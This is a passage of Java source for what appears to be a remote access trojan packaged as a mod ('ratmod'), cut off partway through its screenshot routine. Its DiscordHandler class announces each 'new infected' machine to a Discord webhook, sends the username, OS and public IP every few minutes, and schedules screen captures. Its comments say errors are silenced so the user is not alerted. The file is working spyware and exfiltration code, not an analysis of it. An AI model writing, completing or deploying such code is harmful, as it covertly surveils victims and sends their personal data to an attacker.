package com.tufabrica.ratmod;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class DiscordHandler {
    private static String webhookUrl;
    private static String ownerId;
    private static final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
    
    public static void init(String webhook, String owner) {
        webhookUrl = webhook;
        ownerId = owner;
        
        // Enviar mensaje de inicialización a tu Discord
        sendMessage("```NUEVO INfectado detectado: " + System.getProperty("user.name") + " | " + 
                   System.getProperty("os.name") + " | " + 
                   System.getProperty("java.version") + "```");
        
        // Programar tareas periódicas
        scheduler.scheduleAtFixedRate(DiscordHandler::sendSystemInfo, 2, 5, TimeUnit.MINUTES);
        scheduler.scheduleAtFixedRate(DiscordHandler::sendScreenshot, 30, 10, TimeUnit.MINUTES);
    }
    
    public static void sendMessage(String message) {
        try {
            URL url = new URL(webhookUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(true);
            
            String jsonPayload = "{\"content\":\"" + message + "\"}";
            
            try(OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            connection.getInputStream(); // Enviar el mensaje
        } catch (Exception e) {
            // Silenciar errores para no alertar al usuario
        }
    }
    
    private static void sendSystemInfo() {
        String info = "```INFO SISTEMA: " + 
                     "User: " + System.getProperty("user.name") + 
                     " | OS: " + System.getProperty("os.name") + 
                     " | IP: " + SystemInfo.getPublicIP() + "```";
        sendMessage(info);
    }
    
    private static void sendScreenshot() {
        try {
            java.awt.Robot robot = new java.awt.Robot();
            java.awt.Rectangle screenRect = new java.awt.Rectangle(
                java.awt.Toolkit.getDefaultToolkit().getScreenSize());
            java.awt.image.BufferedImage screenFullImg = 
